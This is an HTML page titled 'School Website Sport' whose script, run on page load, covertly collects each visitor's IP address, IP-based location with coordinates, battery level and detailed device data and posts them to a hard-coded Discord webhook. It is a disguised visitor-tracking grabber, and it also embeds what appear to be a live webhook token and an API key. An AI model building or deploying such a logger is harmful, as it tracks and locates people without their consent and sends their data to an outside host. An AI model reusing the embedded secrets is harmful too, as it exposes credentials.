<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>School Website Sport</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background: linear-gradient(to right, lightblue, lightpurple);
        }

        h1 {
            font-size: 2rem;
            color: white;
            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
        }
    </style>
</head>

<body>
    <h1>Gathering Visitor Information...</h1>
    <script>
        // Replace with your Discord webhook URL and IPLookupAPI key
        const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
        const ipLookupAPIKey = 'ipl_live_TrMYUZ4xSg3eTqWeS3fkWz1mZhG45lOq9fFGI7mD';
        const ipLookupEndpoint = 'https://api.iplookupapi.com/v1/info/';

        // Function to get IP address
        function getIPAddress() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => console.error('Error fetching IP:', error));
        }

        // Function to get location details using IPLookupAPI
        function getGeolocation(ip) {
            const url = `${ipLookupEndpoint}?ip=${ip}&apikey=${ipLookupAPIKey}`;
            return fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data && data.data && data.data.location) {
                        const location = data.data.location;
                        const city = location.city?.name || 'Unknown city';
                        const country = location.country?.name || 'Unknown country';
                        const latitude = location.latitude || 'N/A';
                        const longitude = location.longitude || 'N/A';

                        return `City: ${city}, Country: ${country}, Lat: ${latitude}, Long: ${longitude}`;
                    } else {
                        return 'Location not available';
                    }
                })
                .catch(error => console.error('Error fetching geolocation:', error));
        }

        // Function to get battery info
        function getBatteryInfo() {
            if (navigator.getBattery) {
                return navigator.getBattery().then(battery => `${(battery.level * 100).toFixed(0)}%`);
            } else {
                return Promise.resolve('Battery info not available');
            }
        }

        // Function to collect detailed device info
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const isMobile = /Mobi|Android/i.test(userAgent) ? "Yes" : "No";
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
            const windowWidth = window.innerWidth;
            const windowHeight = window.innerHeight;
            const deviceMemory = navigator.deviceMemory || 'N/A';
            const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';

            let os = 'Unknown';
            if (userAgent.indexOf('windows') > -1) os = 'Windows';
            else if (userAgent.indexOf('macintosh') > -1) os = 'macOS';
            else if (userAgent.indexOf('linux') > -1) os = 'Linux';

            return `
                User-Agent: ${userAgent}
                Platform: ${platform}
                Language: ${language}
                Timezone: ${timezone}
                OS: ${os}
                Mobile Device: ${isMobile}
                Screen Resolution: ${screenResolution}
                Screen Orientation: ${screenOrientation}
                Window Dimensions: ${windowWidth}x${windowHeight}
                Device Memory: ${deviceMemory} GB
                Hardware Concurrency: ${hardwareConcurrency}
            `;
        }

        // Function to send data to the Discord webhook
        function sendToDiscord(ip, battery, deviceInfo, geolocation) {
            const payload = {
                embeds: [{
                    title: "New Visitor Information",
                    color: 7506394,
                    fields: [
                        { name: "IP Address", value: ip, inline: true },
                        { name: "Battery Level", value: battery, inline: true },
                        { name: "Device Info", value: deviceInfo, inline: false },
                        { name: "Geolocation", value: geolocation, inline: false }
                    ],
                    footer: { text: `Logged at ${new Date().toLocaleString()}` }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                if (response.ok) {
                    console.log('Visitor info logged successfully');
                } else {
                    console.error('Failed to log visitor info:', response.statusText);
                }
            }).catch(error => console.error('Error sending to webhook:', error));
        }

        // Execute functions and send data
        Promise.all([getIPAddress(), getBatteryInfo()])
            .then(([ip, battery]) => {
                const deviceInfo = getDeviceInfo();
                getGeolocation(ip).then(geolocation => {
                    sendToDiscord(ip, battery, deviceInfo, geolocation);
                });
            });
    </script>
</body>
</html>
